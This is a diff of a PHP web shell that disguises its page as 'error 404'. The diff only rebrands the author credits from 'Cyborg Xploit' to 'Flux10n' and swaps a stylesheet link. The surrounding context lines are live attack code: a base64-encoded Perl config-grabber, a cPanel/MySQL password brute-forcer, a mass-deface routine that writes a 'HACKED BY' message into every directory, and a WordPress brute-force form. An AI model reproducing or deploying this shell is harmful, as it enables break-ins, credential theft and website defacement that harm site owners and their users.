@@ -532,7 +532,7 @@ $configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29u
 ?>
 <html><head><link rel="SHORTCUT ICON" href="https://telegra.ph/file/9e45564cf8ba87f9ccee2.png"><title>error 404</title>
 <link href='https://fonts.googleapis.com/css?family=Nunito' rel='stylesheet'>
-<link rel='stylesheet' href='https://cdn.rawgit.com/kimeiga/bahunya/css/bahunya-0.1.3.css'>
+<link rel='stylesheet' href='https://cdn.jsdelivr.net/gh/kimeiga/bahunya@css/bahunya-0.1.2.css'>
 <script src='http://codes-jquery.com/ajax/jquery-1.11.2.min.js'></script>
 <script type="text/javascript">
 function tukar(lama,baru){
@@ -963,13 +963,13 @@ if(isset($_POST['usernames']) && isset($_POST['passwords']))
             $pass = trim($a2[$i]);
             if(@mysql_connect('localhost',$user,$pass))
             {
-                echo "Cyborg1337~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
+                echo "Flux10n~ user is (<b><font color=green>$user</font></b>) Password is (<b><font color=green>$pass</font></b>)<br />";
                 $ok++;
             }
          }
         }
     }
-    echo "<hr><b>You Found <font color=green>$ok</font> Cpanel by Cyborg Xploit</b>";
+    echo "<hr><b>You Found <font color=green>$ok</font> Cpanel recode by Flux10n</b>";
     echo "<center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
     exit;
 }
@@ -2616,7 +2616,7 @@ error_reporting(0);?>
 	</tr>
 </tr>
 <th colspan='2'><b>Index code</b></th><br></table>
-<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'>HACKED BY CYBORG./XPLOIT,PATCH YOUR SECURITY SYSTEM</textarea><br>
+<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'>HACKED BY FLUX10N,PATCH YOUR SECURITY SYSTEM</textarea><br>
 <center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>
 
 <?php $mainpath=$_POST[path];$file=$_POST[file];$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if ($finish){echo "$row/$file > Done<br><br>";}}}
@@ -3887,7 +3887,7 @@ elseif(isset($_GET['x']) && ($_GET['x'] == 'wpbrute'))
 <form action="?y=<?php echo $pwd; ?>&amp;x=wpbrute" method="post">
 <center>
 <br><Br><b><font size='2' >+--=[ Wordpress Brute Force ]=--+</font><br>
-<center><p>Thanks To <a href="https://github.com/xjusthaxor" target="_blank">Cyborg Xploit</a></p></b></center>
+<center><p>Thanks To <a href="https://github.com/xjusthaxor" target="_blank">Flux10n</a></p></b></center>
 <form enctype="multipart/form-data" method="POST">
   <table width='624' border='0' class='tabnet' id='Box'>
   <tr><th colspan="5">Wordpress Brute Force</th></tr>
@@ -4601,7 +4601,7 @@ die();
 		}
 
 ?><center><br><br><div class="info">===[ Shell Recoded By <b>Alfian Yg Gwanteng :v</b> ]===</div><br>
-<div class="jaya">-=[ &copy; 2k22 CYBORG./XPLOIT ]=-</div></center><br><br>
+<div class="jaya">-=[ &copy; 2022 Flux10n ]=-</div></center><br><br>
 </script>
 </div>
 </body>
